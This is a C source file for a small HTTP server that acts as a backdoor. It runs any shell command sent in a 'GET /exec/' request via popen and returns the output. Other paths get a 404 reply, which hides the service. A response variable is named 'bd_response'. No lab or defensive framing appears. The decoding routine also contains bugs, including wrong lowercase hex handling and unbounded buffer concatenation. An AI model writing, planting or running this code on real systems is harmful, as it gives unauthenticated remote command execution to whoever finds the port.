#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>

int parse(const char *request) {
    if (memcmp(request, "GET /exec/", strlen("GET /exec/")) == 0) {
        return 1;
    }
    else {
        return 0;
    }
}

char* get_cmd(char request[]) {
    request += 10;
    char* token = strtok(request, "H");
    return token;
}

int ishex(int x)
{
	return	(x >= '0' && x <= '9')	||
		(x >= 'a' && x <= 'f')	||
		(x >= 'A' && x <= 'F');
}
 
int decode(const char *input, char *output) {
    char h1;
    char h2;
    while (*input) {
        if ((*input == '%') && ((h1 = input[1]) && (h2 = input[2])) && 
        (ishex(h1) && ishex(h2))) {
            if (h1 >= 'a') {
                h1 -= 'a' - 'A';
            }
            else if (h1 >= 'A') {
                h1 -= ('A' - 10);
            }
            else {
                h1 -= '0';
            }

            if (h2 >= 'a') {
                h2 -= 'a' - 'A';
            }
            else if (h2 >= 'A') {
                h2 -= ('A' - 10);
            }
            else {
                h2 -= '0';
            }
            *output++ = 16*h1+h2;
            input += 3;
        } 
        else if (*input == '+') {
            *output++ = ' ';
            input++;
        } 
        else {
            *output++ = *input++;
        }
    }
    *output++ = '\0';
}

int main(int argc, char *argv[]) {

    int port = atoi(argv[1]);

    int server_socket;
    server_socket = socket(PF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);
    server_address.sin_addr.s_addr = INADDR_ANY;

    bind(server_socket, (struct sockaddr *) &server_address, sizeof(server_address));
    listen(server_socket, 1);    

    char *notfound_response =
        "HTTP/1.1 404 Not Found\r\n\r\n";

    char *bd_response = 
        "HTTP/1.1 200 OK\r\n\r\n";

    int client_socket;
    char client_buffer[1024];
    char req[1024];

    while(1) {
        client_socket = accept(server_socket, NULL, NULL);
        recv(client_socket, &client_buffer, sizeof(client_buffer), 0);
        decode(client_buffer, req);
        int bd_check = parse(req);

        if (bd_check > 0) {
            char* cmd = get_cmd(req);
            
            char cart[1024];
            char out[15000] = "";
            FILE *pipeout;
            
            pipeout = popen(cmd, "r");
            while (fgets(cart, sizeof(cart), pipeout) != NULL) {
                strcat(out, cart);
            }
            pclose(pipeout);
            
            send(client_socket, bd_response, strlen(bd_response), 0);
            send(client_socket, out, strlen(out), 0);
            close(client_socket);
        }
        
        else {
            send(client_socket, notfound_response, strlen(notfound_response), 0);
            close(client_socket);
        }
    }
    return 0;
}
